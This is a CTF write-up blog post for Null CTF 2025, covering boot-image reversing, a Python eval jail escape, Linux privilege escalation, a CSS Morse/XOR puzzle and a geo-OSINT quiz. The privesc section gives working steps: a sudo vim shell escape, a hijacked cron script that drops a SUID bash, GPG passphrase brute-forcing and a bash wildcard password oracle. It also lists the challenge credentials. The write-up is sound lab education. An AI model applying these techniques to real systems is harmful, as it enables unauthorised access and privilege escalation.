@@ -1,0 +1,831 @@
+---
+title: 'Null CTF 2025'
+description: 'Writeups for the challenges i enjoyed solving'
+date: 2025-12-05
+tags: ['ctf', 'writeups', 'nullctf']
+authors: ['hara']
+image: './images/nullctf2025/null_ctf_logo.png'
+toc: false
+---
+
+## Solved challenges
+
+- [WordleOS](#wordleos)
+- [abcdef](#abcdef)
+- [My name is Preeveske](#preeveske)
+- [What does the fox say?](#fox)
+- [(geo)osint](#osint)
+
+---
+
+<a id="wordleos"></a>
+
+## WordleOS
+
+Category: Rev / Misc — Difficulty: Medium
+
+We’re given a raw bootable image `wordle_os.bin`. Run it with QEMU:
+
+```bash
+hara@hara:~/Downloads$ qemu-system-x86_64 -drive format=raw,file=wordle_os.bin
+```
+
+It prints **Welcome to WordleOS!** and lets you type guesses. Because it has no colors, the only feedback is **Correct!** when you enter the right word.
+
+So instead of guessing, we recover the correct word (the flag) from the binary.
+
+---
+
+### 1) Quick recon
+
+`strings` shows the UI messages, but not the full answer:
+
+```bash
+hara@hara:~/Downloads$ strings wordle_os.bin | grep -E "WordleOS|Correct"
+Welcome to WordleOS!
+Correct!
+```
+
+That means the flag is not stored as a simple ASCII string.
+
+---
+
+### 2) Extract the embedded kernel ELF
+
+The raw disk image contains an ELF kernel inside it. First, find all ELF headers:
+
+```bash
+hara@hara:~/Downloads$ python3 - <<'PY'
+import pathlib, re
+b = pathlib.Path("wordle_os.bin").read_bytes()
+for m in re.finditer(b"\x7fELF", b):
+    print("ELF @", m.start())
+PY
+ELF @ 21813
+ELF @ 22630
+ELF @ 52736
+```
+
+The valid x86_64 kernel is the one at `52736`. Extract it:
+
+```bash
+hara@hara:~/Downloads$ dd if=wordle_os.bin bs=1 skip=52736 of=kernel.elf status=none
+hara@hara:~/Downloads$ file kernel.elf
+kernel.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
+
+hara@hara:~/Downloads$ readelf -h kernel.elf | head
+ELF Header:
+  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
+  Class:                             ELF64
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Version:                           0x1
+```
+
+---
+
+### 3) Find the “Correct!” code path
+
+A nice anchor is the `.rodata` address that points into the `"Correct!\n"` string:
+
+```bash
+hara@hara:~/Downloads$ objdump -d -Mintel kernel.elf | grep -n "200311"
+1584:  20377b:  48 8d 35 8f cb ff ff    lea    rsi,[rip+0xffffffffffffcb8f]        # 200311 <...>
+```
+
+This tells us: the code around that address is the success path that prints **Correct!**.
+
+To confirm the bytes, dump `.rodata` around it:
+
+```bash
+hara@hara:~/Downloads$ objdump -s -j .rodata --start-address=0x2002f0 --stop-address=0x200360 kernel.elf
+```
+
+You’ll see `Welcome to WordleOS!` and `.Correct!` in the output.
+
+---
+
+### 4) The trick: VGA text mode (why the constants look weird)
+
+The program doesn’t compare a normal string buffer. It compares what’s written into the **VGA text buffer**.
+
+In VGA text mode, each displayed character takes **2 bytes**:
+
+```text
+[ASCII_CHAR][ATTRIBUTE]
+```
+
+The attribute is typically `0x0f` for white text on black background.
+
+So if the screen shows letters separated by spaces, the memory looks like:
+
+```text
+'n' 0x0f ' ' 0x0f 'u' 0x0f ' ' 0x0f ...
+```
+
+That’s why in the disassembly you’ll see comparisons against 64-bit constants: they’re just multiple VGA cells packed into a single value.
+Some constants are slightly “hidden” by adding small numbers like `+0x33`, `+0x3e`, `+0x15` to tweak one character byte.
+
+---
+
+### 5) Decode the constants → recover the flag
+
+Once you collect the constants used in the comparison block, decode them like this:
+
+```bash
+hara@hara:~/Downloads$ python3 - <<'PY'
+chunks = [
+    0xf200f750f200f6e,
+    0xf200f6c0f200f6c,
+    0xf200f740f200f30 + 0x33,
+    0xf200f7b0f200f66,
+    0xf200f300f200f62,
+    0xf200f740f200f30,
+    0xf200f310f200f5f,
+    0xf200f740f200f30 + 0x3e,
+    0xf200f5f0f200f30,
+    0xf200f300f200f62 + 0x15,
+    0xf200f640f200f72,
+    0xf200f330f200f6c,
+    0xf200f200f200f7d,
+]
+
+def decode(v):
+    b = v.to_bytes(8, "little")
+    return "".join(chr(b[i]) for i in range(0, 8, 2))
+
+s = "".join(decode(x) for x in chunks)
+print("with spaces:", s)
+print("flag:", s.replace(" ", ""))
+PY
+with spaces: n u l l c t f { b 0 0 t _ 1 n t 0 _ w 0 r d l 3 }
+flag: nullctf{b00t_1nt0_w0rdl3}
+```
+
+### Flag
+
+```text
+nullctf{b00t_1nt0_w0rdl3}
+```
+
+---
+
+<a id="abcdef"></a>
+
+## abcdef
+
+Category: Misc — Difficulty: Easy
+
+Connect:
+
+```bash
+hara@hara:~/Downloads$ nc 34.118.61.99 10089
+>
+```
+
+The jail says you can only use letters `a`–`f`.
+
+---
+
+### What’s the vulnerability?
+
+The jail filters your input, then runs it with `eval`. The key vulnerable line is:
+
+```py
+eval(x)
+```
+
+And the filter is based on a **mutable set** you can access:
+
+```py
+abcdef = set("abcdef")
+...
+if c.isalpha() and c not in abcdef:
+    return False
+```
+
+Since `abcdef` is in the same scope as `eval(x)`, we can call `abcdef.add(...)` to expand the whitelist. The loop keeps running, so the whitelist stays expanded for the next input.
+
+---
+
+### Solve
+
+#### 1) Add the letters we need
+
+```bash
+> (abcdef.add("%c"%105),abcdef.add("%c"%109),abcdef.add("%c"%112),abcdef.add("%c"%111),abcdef.add("%c"%114),abcdef.add("%c"%116),abcdef.add("%c"%115),abcdef.add("%c"%121),abcdef.add("%c"%104),abcdef.add("%c"%117))
+```
+
+#### 2) Spawn a shell
+
+```bash
+> __import__('os').system('sh')
+```
+
+#### 3) Read the flag
+
+```bash
+ls
+flag.txt
+cat flag.txt
+nullctf{g!bb3r!sh_d!dnt_st0p_y0u!}
+```
+
+### Flag
+
+```text
+nullctf{g!bb3r!sh_d!dnt_st0p_y0u!}
+```
+
+---
+
+<a id="preeveske"></a>
+
+## My name is Preeveske
+
+Category: Misc / Privesc — Difficulty: Medium
+
+We’re given SSH creds:
+
+- `stefan:b2hRJVkVr2`
+- host: `34.118.61.99:10123`
+
+Goal: get root and read `/root/flag.txt`.
+
+---
+
+### 1) stefan → toma (sudo misconfig: vim)
+
+```bash
+hara@hara:~/Downloads$ ssh stefan@34.118.61.99 -p 10123
+stefan@aef6818cd889:~$ sudo -l
+User stefan may run the following commands on aef6818cd889:
+    (toma) NOPASSWD: /usr/bin/vim
+```
+
+Escape via vim:
+
+```bash
+stefan@aef6818cd889:~$ sudo -u toma vim -c ':!/bin/sh'
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+toma@aef6818cd889:/home/stefan$
+```
+
+---
+
+### 2) toma → raul (cron job + writable script)
+
+Find the cron job:
+
+```bash
+toma@aef6818cd889:/opt$ grep -r "disk_space" /etc/cron* 2>/dev/null
+/etc/cron.d/disk_space:* * * * * raul cd /opt/operators && ./disk_space.py
+```
+
+Replace the script to drop a SUID bash:
+
+```bash
+toma@aef6818cd889:/opt$ rm /opt/operators/disk_space.py
+toma@aef6818cd889:/opt$ cat > /opt/operators/disk_space.py << 'EOF'
+#!/usr/bin/python3
+import os, subprocess
+
+os.system('cp /bin/bash /tmp/raul_bash')
+os.system('chown raul:raul /tmp/raul_bash')
+os.system('chmod 4755 /tmp/raul_bash')
+
+with open("disk_space.txt", "wb") as f:
+    f.write(subprocess.check_output(["/usr/bin/df", "-h"]))
+EOF
+toma@aef6818cd889:/opt$ chmod +x /opt/operators/disk_space.py
+```
+
+After cron runs:
+
+```bash
+toma@aef6818cd889:/opt$ /tmp/raul_bash -p
+raul_bash-5.2$
+```
+
+---
+
+### 3) raul → tudor (decrypt `creds.txt.gpg`)
+
+From `/home/raul`, grab:
+
+- `creds.txt.gpg`
+- the `.gnupg/` directory
+
+Move them to your VM (I placed them in `./loot/`), then brute-force the GPG passphrase with rockyou.
+
+```bash
+hara@hara:~/Downloads$ cat sol.sh
+#!/bin/bash
+# Bruteforce passphrase for creds.txt.gpg using rockyou + loopback pinentry
+
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+GPG_DIR="$(pwd)/loot/.gnupg"
+TARGET="creds.txt.gpg"
+
+echo "[*] Starting GPG bruteforce on $TARGET..."
+echo "[*] Using GNUPGHOME: $GPG_DIR"
+
+# allow passing passphrase non-interactively
+mkdir -p "$GPG_DIR"
+echo "allow-loopback-pinentry" >> "$GPG_DIR/gpg-agent.conf"
+gpgconf --homedir "$GPG_DIR" --kill gpg-agent >/dev/null 2>&1
+
+count=0
+while IFS= read -r pass; do
+  count=$((count+1))
+
+  gpg --homedir "$GPG_DIR" --batch --yes --pinentry-mode loopback       --passphrase "$pass" --dry-run -d "$TARGET" 2>/dev/null
+
+  if [ $? -eq 0 ]; then
+    echo ""
+    echo "[+] FOUND PASSWORD: $pass"
+    echo "[+] Decrypted output:"
+    gpg --homedir "$GPG_DIR" --batch --yes --pinentry-mode loopback         --passphrase "$pass" -d "$TARGET"
+    exit 0
+  fi
+
+  if (( count % 1000 == 0 )); then
+    echo -ne "[*] Tried $count passwords...\r"
+  fi
+done < "$WORDLIST"
+
+echo ""
+echo "[-] Password not found in wordlist."
+```
+
+Run it:
+
+```bash
+hara@hara:~/Downloads$ chmod +x sol.sh
+hara@hara:~/Downloads$ ./sol.sh
+```
+
+Result:
+
+- passphrase: `qwerty1`
+- decrypted creds: `tudor:jVWU9XMXy8`
+
+Login:
+
+```bash
+hara@hara:~/Downloads$ ssh tudor@34.118.61.99 -p 10123
+```
+
+---
+
+### 4) tudor → root (sudo script + bash wildcard bug)
+
+```bash
+tudor@aef6818cd889:~$ sudo -l
+User tudor may run the following commands on aef6818cd889:
+    (root) NOPASSWD: /opt/login.sh
+```
+
+The bug: in bash `[[ $password != $input ]]`, `$input` is treated like a pattern. So `*` matches anything:
+
+```bash
+tudor@aef6818cd889:/opt$ sudo /opt/login.sh "*"
+Logged in!
+```
+
+Then brute the real password with a prefix oracle:
+
+```bash
+tudor@aef6818cd889:/opt$ known=""
+tudor@aef6818cd889:/opt$ chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
+
+tudor@aef6818cd889:/opt$ while true; do
+    found=0
+    for char in $(echo $chars | grep -o .); do
+        if sudo /opt/login.sh "$known$char*" | grep -q "Logged in"; then
+            known="$known$char"
+            echo "Found so far: $known"
+            found=1
+            break
+        fi
+    done
+    [ $found -eq 0 ] && echo "Final Password: $known" && break
+done
+Final Password: Wc2JEFy4LB
+```
+
+Become root and read flag:
+
+```bash
+tudor@aef6818cd889:/opt$ su root
+Password: Wc2JEFy4LB
+root@aef6818cd889:~# cat /root/flag.txt
+nullctf{mult1pl3_5t3p5_t0_r00t}
+```
+
+### Flag
+
+```text
+nullctf{mult1pl3_5t3p5_t0_r00t}
+```
+
+<a id="fox"></a>
+
+## What does the fox say?
+
+Category: Misc / Web — Difficulty: Easy
+
+We open:
+
+```bash
+hara@hara:~/Downloads$ firefox http://public.ctf.r0devnull.team:3012
+```
+
+On Chrome/Google it showed **“Oops! Unsupported Browser”** with a fox GIF, but Firefox worked and showed a horse GIF with the message:
+
+> “you just met my friendly horse...”
+
+That hint made me think of the song **“What Does The Fox Say?”** (Ylvis). At around 1:35 it jokes:
+
+> “But if you meet a friendly horse
+> Will you communicate by
+> Mo-o-o-o-orse?”
+
+So the “horse” page was pointing at **Morse code**.
+
+---
+
+## 1) CSS weirdness → Morse
+
+In `style.css` I noticed a huge `@keyframes blink` with tons of tiny percentage steps like:
+
+```css
+@keyframes blink {
+  0.00% { opacity: 1; }
+  0.79% { opacity: 1; }
+  1.57% { opacity: 1; }
+  2.36% { opacity: 0; }
+  ...
+}
+```
+
+Those `opacity: 1` / `opacity: 0` values form a binary “on/off” signal.
+The animation uses `steps(N, end)` so the timeline is discretized into fixed ticks.
+
+Idea:
+- `opacity = 1` → signal ON
+- `opacity = 0` → signal OFF
+- run-lengths of ON represent dots/dashes (ex: `1 tick = .`, `3 ticks = -`)
+- longer OFF gaps separate letters
+
+---
+
+## 2) Script to extract Morse from the CSS
+
+I wrote a quick decoder that:
+1. extracts `steps(N, end)` to know how many ticks exist
+2. reads the last `opacity` at each tick percentage
+3. run-length encodes the 1/0 stream
+4. converts runs into Morse
+5. decodes Morse to text
+
+```py
+# extract_morse.py
+import re
+import sys
+import morse_talk as mt  # pip install morse-talk
+
+MORSE_ON = {1: ".", 3: "-"}  # 1 tick = dot, 3 ticks = dash
+
+def rle(bits):
+    runs = []
+    for b in bits:
+        if not runs or runs[-1][0] != b:
+            runs.append([b, 1])
+        else:
+            runs[-1][1] += 1
+    return runs
+
+def main(path: str):
+    css = open(path, "r", encoding="utf-8", errors="replace").read()
+
+    # Get steps(N, end)
+    m = re.search(r"steps\(\s*(\d+)\s*,\s*end\s*\)", css)
+    if not m:
+        raise SystemExit("Couldn't find steps(N, end) in CSS.")
+    n = int(m.group(1))
+
+    # Extract @keyframes blink { ... }
+    km = re.search(r"@keyframes\s+blink\s*\{(.*?)\n\}", css, re.S)
+    if not km:
+        raise SystemExit("Couldn't find @keyframes blink block.")
+
+    block = km.group(1)
+
+    # Grab all `X% { opacity: Y; }` entries, keeping the LAST opacity for each percent
+    pairs = re.findall(r"([\d.]+)%\s*\{\s*opacity:\s*([01])\s*;\s*\}", block)
+    last_at = {}
+    for p_s, o_s in pairs:
+        last_at[p_s] = int(o_s)  # later entries overwrite earlier ones at same %
+
+    step_pct = 100.0 / n
+    keys = [f"{(i * step_pct):.2f}" for i in range(n)]  # 0..n-1 tick boundaries
+    bits = [last_at[k] for k in keys]  # 1=on, 0=off
+
+    runs = rle(bits)
+
+    # Convert to morse letters (0-run length 3 => letter gap)
+    letters = []
+    cur = ""
+    for v, L in runs:
+        if v == 1:
+            cur += MORSE_ON.get(L, "-" if L > 1 else ".")
+        else:
+            if L >= 3:
+                if cur:
+                    letters.append(cur)
+                    cur = ""
+    if cur:
+        letters.append(cur)
+
+    morse = " ".join(letters)
+    text = mt.decode(morse)
+
+    print("Morse:", morse)
+    print("Text :", text)
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        raise SystemExit(f"Usage: {sys.argv[0]} /path/to/style.css")
+    main(sys.argv[1])
+```
+
+Running it:
+
+```bash
+hara@hara:~/Downloads$ python3 extract_morse.py style.css
+Morse: -.-- .-.. ...- .. ... ..--- ----- .---- ...--
+Text : YLVIS2013
+```
+
+So we get the key: **`YLVIS2013`**.
+
+---
+
+## 3) robots.txt → secret hint
+
+Next step was checking robots:
+
+```bash
+hara@hara:~/Downloads$ curl -s http://public.ctf.r0devnull.team:3012/robots.txt
+```
+
+It disallowed:
+
+```text
+Disallow: /secret.txt
+```
+
+Visiting `/secret.txt` gave:
+
+- a hint: *“The fox whispers a secret hidden in the noise... Can you hear it?”*
+- a Base32-looking blob:
+
+```text
+G44TUJJQIZLEU5DKHZTSONDNKRMF2YATGJ4D2VLPKUBDO5LFHNRFYVYCK5UCEMJU
+```
+
+---
+
+## 4) Decrypt the secret (Base32 + XOR with the CSS key)
+
+The blob decodes cleanly as Base32, and the output looks like XOR’d bytes.
+Use the Morse result `YLVIS2013` as the repeating XOR key:
+
+```py
+#!/usr/bin/env python3
+import base64
+
+b32 = "G44TUJJQIZLEU5DKHZTSONDNKRMF2YATGJ4D2VLPKUBDO5LFHNRFYVYCK5UCEMJU"
+key = b"YLVIS2013"
+
+data = base64.b32decode(b32, casefold=True)
+pt = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+print(pt.decode())
+```
+
+Run:
+
+```bash
+hara@hara:~/Downloads$ python3 decrypt.py
+nullctf{G3r1ng_din9_d1ng_d1n93r1ng3d1ng}
+```
+
+---
+
+## Flag
+
+```text
+nullctf{G3r1ng_din9_d1ng_d1n93r1ng3d1ng}
+```
+
+<a id="osint"></a>
+
+## (geo)osint
+
+Category: OSINT — Difficulty: Medium
+
+Connect:
+
+```bash
+hara@hara:~/Downloads$ nc public.ctf.r0devnull.team 3016
+```
+
+This was a 5-question OSINT quiz (mostly geo OSINT). Each question had an image, and you had to answer in the required format.
+
+At the end, the server returned the flag.
+
+---
+
+## Provided photos
+
+### Q1 photo (challenge)
+
+![Q1 photo](./images/nullctf2025/osint_1.jpg)
+
+### Q2 photo (challenge)
+
+![Q2 photo](./images/nullctf2025/osint_2.jpg)
+
+### Q3 photo (challenge)
+
+![Q3 photo](./images/nullctf2025/osint_3.jpg)
+
+### Q4 photo (challenge)
+
+![Q4 photo](./images/nullctf2025/osint_4.jpg)
+
+### Q5 photo (challenge)
+
+![Q5 photo](./images/nullctf2025/osint_5.png)
+
+---
+
+## Answers (as entered)
+
+```text
+Question 1: Palace_of_Parliament
+Question 2: Calea Craiovei 127, Pitești 110207
+Question 3: Politehnica_Business_Tower
+Question 4: Gara_Pitesti
+Question 5: 29.5604361,-95.0853103
+```
+
+---
+
+## Q1 — Building name
+
+**Prompt:** “Could u name the name of the building?”  
+**Format:** case sensitive, replace spaces with `_`
+
+The first photo was from **DefCamp**, which was held at the **Palace of the Parliament** in Bucharest, so the formatted answer is:
+
+```text
+Palace_of_Parliament
+```
+
+---
+
+## Q2 — Versace Lamborghini address
+
+**Prompt:** “Could u name the address where i found this versace lamborghini?”  
+**Format:** `street street_number, city postal_code`
+
+The second photo showed a Lamborghini with an **AG** plate at a **Rompetrol** gas station in Pitești.  
+I searched for Rompetrol stations in Pitești, matched the location from the image, and used the exact formatted address:
+
+```text
+Calea Craiovei 127, Pitești 110207
+```
+
+---
+
+## Q3 — Building near the area (Bucharest)
+
+**Prompt:** “Could u name the name of the building near this area?”  
+**Format:** case sensitive, replace spaces with `_`
+
+The third photo was taken on **Bulevardul Iuliu Maniu** (Bucharest).  
+I searched the visible betting shops and confirmed the spot around:
+
+```text
+15 Bulevardul Iuliu Maniu
+```
+
+The nearby building name (as required by the challenge) was:
+
+```text
+Politehnica_Business_Tower
+```
+
+[Open in Google Maps](https://www.google.com/maps/place/Politehnica+Business+Tower/@44.4340617,26.0411432,17.75z/data=!4m15!1m8!3m7!1s0x40b201c87c50268d:0x86af397e968ed4d8!2sBulevardul+Iuliu+Maniu+15,+București!3b1!8m2!3d44.4337551!4d26.0424978!16s%2Fg%2F11cpn3xzmt!3m5!1s0x40b201f609995a6f:0x8a7b024778b7d337!8m2!3d44.4340819!4d26.0407948!16s%2Fg%2F11h5lv2n9y?entry=ttu&g_ep=EgoyMDI1MTIwMi4wIKXMDSoASAFQAw%3D%3D)
+
+---
+
+## Q4 — Building near the area (Pitești)
+
+**Prompt:** “Could u name the name of the building near this area?”  
+**Format:** case sensitive, replace spaces with `_` (no special chars)
+
+For the fourth photo, I knew it was in **Pitești** (AG plates). For this question, ChatGPT helped me a bit. After I told it the city, it said the answer was:
+
+```text
+Gara_Pitesti
+```
+
+---
+
+## Q5 — Coordinates with 7 decimals
+
+**Prompt:** “I want the coordonates from this place with the precision of 7 decimals!”  
+**Format:** `coord1,coord2`
+
+The fifth photo was taken from an **ISS view**. Google Maps has an ISS/space view, so I moved around until the stickers and view matched.  
+Once it matched, the coordinates were directly visible in the URL:
+
+```text
+29.5604361,-95.0853103
+```
+
+[Open in Google Maps](https://www.google.com/maps/space/iss/@29.5604361,-95.0853103,2a,75y,254.24h,79.96t/data=!3m7!1e1!3m5!1sfjYhF9xOJncAAAQvxjSfVA!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D10.041731728769008%26panoid%3DfjYhF9xOJncAAAQvxjSfVA%26yaw%3D254.24107839900205!7i5656!8i2828?entry=ttu&g_ep=EgoyMDI1MTIwMi4wIKXMDSoASAFQAw%3D%3D)
+
+---
+
+## Full run (proof)
+
+```text
+================================================================================
+OSINT QUIZ
+================================================================================
+
+Answer the following questions about geo(?)osint.
+
+
+Question 1:
+--------------------------------------------------------------------------------
+Could u name the name of the building?
+format: the flag is case sensitive and replace the ' ' with '_'
+
+Your answer: Palace_of_Parliament
+✓ Correct!
+
+Question 2:
+--------------------------------------------------------------------------------
+Could u name the address where i found this versace lamborghini?
+format: the flag is case sensitive. format: 'street street_number, city postal_code'
+
+Your answer: Calea Craiovei 127, Pitești 110207
+✓ Correct!
+
+Question 3:
+--------------------------------------------------------------------------------
+ Could u name the name of the building near this area?
+format: the flag is case sensitive and replace the " " with "_"
+
+Your answer: Politehnica_Business_Tower
+✓ Correct!
+
+Question 4:
+--------------------------------------------------------------------------------
+Could u name the name of the building near this area?
+format: the flag is case sensitive and replace the " " with "_"(no special chars used!)
+
+Your answer: Gara_Pitesti
+✓ Correct!
+
+Question 5:
+--------------------------------------------------------------------------------
+I want the coordonates from this place with the precision of 7 decimals!
+format: coord1,coord2
+
+Your answer: 29.5604361,-95.0853103
+✓ Correct!
+
+================================================================================
+QUIZ COMPLETE
+Here is your flag: nullctf{pl34s3_d0_n07_d0x_m3!}
+================================================================================
+```
+
+---
+
+## Flag
+
+```text
+nullctf{pl34s3_d0_n07_d0x_m3!}
+```
